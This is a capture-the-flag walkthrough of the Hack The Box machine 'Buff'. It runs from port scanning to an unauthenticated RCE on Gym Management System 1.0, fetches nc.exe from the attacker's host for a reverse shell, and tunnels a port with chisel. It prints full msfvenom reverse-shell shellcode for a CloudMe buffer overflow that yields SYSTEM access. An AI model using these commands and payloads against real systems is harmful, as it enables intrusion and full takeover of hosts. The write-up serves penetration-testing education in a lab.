## Default Information
IP Address: 10.10.10.198\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.198    buff.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
{masscan output}
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 7680	| pando-pub | NIL | Open |
| 8080	| http | Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | Open |

### Enumeration of port 7680
The nmap output on port 7680 shows a service of pando-pub, but we are unable to find any public exploits for pando-pub. Since we are unable to find much information for port 7680,  we will move on to port 8080.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit pando-pub
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

### Web Enumeration of port 8080
First, let us use Gobuster to enumerate the endpoints on port 8080. From the output,  we are able to find a few interesting endpoints with status code of 200 and 301 which we will look into furthur.

```
http://10.10.10.198:8080/Index.php            (Status: 200) [Size: 4969]
http://10.10.10.198:8080/About.php            (Status: 200) [Size: 5337]
http://10.10.10.198:8080/Home.php             (Status: 200) [Size: 143]
http://10.10.10.198:8080/Contact.php          (Status: 200) [Size: 4169]
http://10.10.10.198:8080/LICENSE              (Status: 200) [Size: 18025]
http://10.10.10.198:8080/about.php            (Status: 200) [Size: 5337]
http://10.10.10.198:8080/att.php              (Status: 200) [Size: 816]
http://10.10.10.198:8080/contact.php          (Status: 200) [Size: 4169]
http://10.10.10.198:8080/edit.php             (Status: 200) [Size: 4282]
http://10.10.10.198:8080/facilities.php       (Status: 200) [Size: 5961]
http://10.10.10.198:8080/feedback.php         (Status: 200) [Size: 4252]
http://10.10.10.198:8080/home.php             (Status: 200) [Size: 143]
http://10.10.10.198:8080/index.php            (Status: 200) [Size: 4969]
http://10.10.10.198:8080/license              (Status: 200) [Size: 18025]
http://10.10.10.198:8080/packages.php         (Status: 200) [Size: 7791]
http://10.10.10.198:8080/register.php         (Status: 200) [Size: 137]
http://10.10.10.198:8080/up.php               (Status: 200) [Size: 209]
http://10.10.10.198:8080/upload.php           (Status: 200) [Size: 107]
http://10.10.10.198:8080/att                  (Status: 301) [Size: 341] [--> http://10.10.10.198:8080/att/]
http://10.10.10.198:8080/boot                 (Status: 301) [Size: 342] [--> http://10.10.10.198:8080/boot/]
http://10.10.10.198:8080/ex                   (Status: 301) [Size: 340] [--> http://10.10.10.198:8080/ex/]
http://10.10.10.198:8080/img                  (Status: 301) [Size: 341] [--> http://10.10.10.198:8080/img/]
http://10.10.10.198:8080/include              (Status: 301) [Size: 345] [--> http://10.10.10.198:8080/include/]
http://10.10.10.198:8080/profile              (Status: 301) [Size: 345] [--> http://10.10.10.198:8080/profile/]
http://10.10.10.198:8080/upload               (Status: 301) [Size: 344] [--> http://10.10.10.198:8080/upload/]
http://10.10.10.198:8080/workouts             (Status: 301) [Size: 346] [--> http://10.10.10.198:8080/workouts/]
```

Looking at http://buff.htb:8080/contact.php, we can know that this site was made using the Gym Management Software 1.0 from Projectworlds.in

![Gym Management Software](https://github.com/joelczk/writeups/blob/main/HTB/Images/Buff/gym_management_software.png)

## Exploit
### RCE on Gym Management System 1.0
Looking at [exaploitdb](https://www.exploit-db.com/exploits/48506), we are able to find an unauthenticated RCE for the Gym Management System 1.0.

Next, what we will do is to execute the exploit code to obtain an RCE. This creates a webshell for us, which will allow us to gain access to the backend server. 

```
┌──(HTB2)─(kali㉿kali)-[~/Desktop/buff]
└─$ python exploit.py http://buff.htb:8080/                                                                      1 ⨯
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                               
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun
```

However, this is an unstable shell. What we will do is that we will upload nc.exe onto the server to create a reverse shell instead.

```
C:\xampp\htdocs\gym\upload> powershell.exe -command iwr -Uri http://10.10.16.3:3000/nc.exe -Outfile C:\xampp\htdocs\gym\upload\nc.exe
�PNG
```

### Obtaining reverse shell

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.198] 49705
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun
```

### Obtaining user flag

```
c:\Users\shaun\Desktop>type user.txt
type user.txt
<Redacted user flag>
```
### Enumeration of server for privilege escalation to SYSTEM
First, let us check the privileges that we have on the buff\shaun user. From the output, there are no privileges that we could exploit. 

```
C:\Windows\Temp>whoami /priv                                                                                                                                                                                        
whoami /priv                                                                                                                                                                                                        
                                                                                                                                                                                                                    
PRIVILEGES INFORMATION                                                                                                                                                                                              
----------------------                                                                                                                                                                                              
                                                                                                                                                                                                                    
Privilege Name                Description                          State                                                                                                                                            
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Using winpeas, we are able to find that there is a local port 8888 that is open on the local host, which is running a CloudMe process.

```
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         936             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5868            svchost
  TCP        0.0.0.0               7680          0.0.0.0               0               Listening         6500            svchost
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         2832            C:\xampp\apache\bin\httpd.exe
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         520             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1104            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1576            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2120            spoolsv
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         664             services
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         680             lsass
  TCP        10.10.10.198          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.10.198          8080          10.10.16.3            57340           Established       2832            C:\xampp\apache\bin\httpd.exe
  TCP        10.10.10.198          49716         10.10.16.3            4000            Established       8940            C:\xampp\htdocs\gym\upload\nc.exe
  TCP        127.0.0.1             3306          0.0.0.0               0               Listening         3924            C:\xampp\mysql\bin\mysqld.exe
  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         9080            CloudMe
```

Next, we will try to find the executable that is running the process name CloudMe using tasklist. It turns out that we have an executable CloudMe.exe that is running the process.

```
C:\Windows\Temp>tasklist /v | findstr CloudMe
tasklist /v | findstr CloudMe
CloudMe.exe                    420                            0     37,312 K Unknown         N/A                                                     0:00:00 N/A 
```

Searching up CloudMe.exe online, we are able to find a buffer overflow exploit on [exploitdb](https://www.exploit-db.com/exploits/48389). However, we will need to generate our own reverse shell payload using msfvenom since we want to create a reverse shell.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/buff]
└─$ msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=5000 -b '\x00\x0A\x0D' -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xba\xba\x41\x62\xd7\xdb\xd1\xd9\x74\x24\xf4\x58"
payload += b"\x29\xc9\xb1\x52\x31\x50\x12\x03\x50\x12\x83\x52"
payload += b"\xbd\x80\x22\x5e\xd6\xc7\xcd\x9e\x27\xa8\x44\x7b"
payload += b"\x16\xe8\x33\x08\x09\xd8\x30\x5c\xa6\x93\x15\x74"
payload += b"\x3d\xd1\xb1\x7b\xf6\x5c\xe4\xb2\x07\xcc\xd4\xd5"
payload += b"\x8b\x0f\x09\x35\xb5\xdf\x5c\x34\xf2\x02\xac\x64"
payload += b"\xab\x49\x03\x98\xd8\x04\x98\x13\x92\x89\x98\xc0"
payload += b"\x63\xab\x89\x57\xff\xf2\x09\x56\x2c\x8f\x03\x40"
payload += b"\x31\xaa\xda\xfb\x81\x40\xdd\x2d\xd8\xa9\x72\x10"
payload += b"\xd4\x5b\x8a\x55\xd3\x83\xf9\xaf\x27\x39\xfa\x74"
payload += b"\x55\xe5\x8f\x6e\xfd\x6e\x37\x4a\xff\xa3\xae\x19"
payload += b"\xf3\x08\xa4\x45\x10\x8e\x69\xfe\x2c\x1b\x8c\xd0"
payload += b"\xa4\x5f\xab\xf4\xed\x04\xd2\xad\x4b\xea\xeb\xad"
payload += b"\x33\x53\x4e\xa6\xde\x80\xe3\xe5\xb6\x65\xce\x15"
payload += b"\x47\xe2\x59\x66\x75\xad\xf1\xe0\x35\x26\xdc\xf7"
payload += b"\x3a\x1d\x98\x67\xc5\x9e\xd9\xae\x02\xca\x89\xd8"
payload += b"\xa3\x73\x42\x18\x4b\xa6\xc5\x48\xe3\x19\xa6\x38"
payload += b"\x43\xca\x4e\x52\x4c\x35\x6e\x5d\x86\x5e\x05\xa4"
payload += b"\x41\x6b\xd0\xb6\x92\x03\xe6\xb6\x87\x5b\x6f\x50"
payload += b"\xcd\x4b\x26\xcb\x7a\xf5\x63\x87\x1b\xfa\xb9\xe2"
payload += b"\x1c\x70\x4e\x13\xd2\x71\x3b\x07\x83\x71\x76\x75"
payload += b"\x02\x8d\xac\x11\xc8\x1c\x2b\xe1\x87\x3c\xe4\xb6"
payload += b"\xc0\xf3\xfd\x52\xfd\xaa\x57\x40\xfc\x2b\x9f\xc0"
payload += b"\xdb\x8f\x1e\xc9\xae\xb4\x04\xd9\x76\x34\x01\x8d"
payload += b"\x26\x63\xdf\x7b\x81\xdd\x91\xd5\x5b\xb1\x7b\xb1"
payload += b"\x1a\xf9\xbb\xc7\x22\xd4\x4d\x27\x92\x81\x0b\x58"
payload += b"\x1b\x46\x9c\x21\x41\xf6\x63\xf8\xc1\x06\x2e\xa0"
payload += b"\x60\x8f\xf7\x31\x31\xd2\x07\xec\x76\xeb\x8b\x04"
payload += b"\x07\x08\x93\x6d\x02\x54\x13\x9e\x7e\xc5\xf6\xa0"
payload += b"\x2d\xe6\xd2"
```

Additionally, we may need to do port-forwarding with chisel to forward port 8080 to our localhost as well. 

### Port-Forwarding using chisel

Firstly, we will have to download the windows version of chisel from the link [here](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz)

Afterwards, we will transfer the chisel executable to the windows server and forward network traffic from port 8888 of our chisel executable of the windows server to port 8000 of our chisel executable on the local machine.

```
C:\Windows\Temp>.\chisel_windows.exe client 10.10.16.3:8000 R:8888:127.0.0.1:8888
.\chisel_windows.exe client 10.10.16.3:8000 R:8888:127.0.0.1:8888
2022/02/20 15:37:32 client: Connecting to ws://10.10.16.3:8000
2022/02/20 15:37:36 client: Connected (Latency 247.8283ms)


┌──(kali㉿kali)-[~/Desktop/buff]
└─$ ./chisel_amd64 server -p 8000 --reverse                                                                    126 ⨯
2022/02/20 10:26:13 server: Reverse tunnelling enabled
2022/02/20 10:26:13 server: Fingerprint CLNrL7ACeYCdG+FvJdqy48TvaK8+CZG8hhIkrZT/1Rc=
2022/02/20 10:26:13 server: Listening on http://0.0.0.0:8000
2022/02/20 10:30:34 server: session#1: Client version (1.7.7) differs from server version (1.7.6)
2022/02/20 10:30:34 server: session#1: tun: proxy#R:8888=>8888: Listening
```

### Privilege Escalation to SYSTEM privileges
Using the buffer overflow exploit that we have found earlier and replace the payload with the msfvenom payload that we have generated earlier.

Executing the exploit script will then generate a reverse shell with SYSTEM privileges.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 5000
listening on [any] 5000 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.198] 49727
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>
```

### Obtaining root flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```
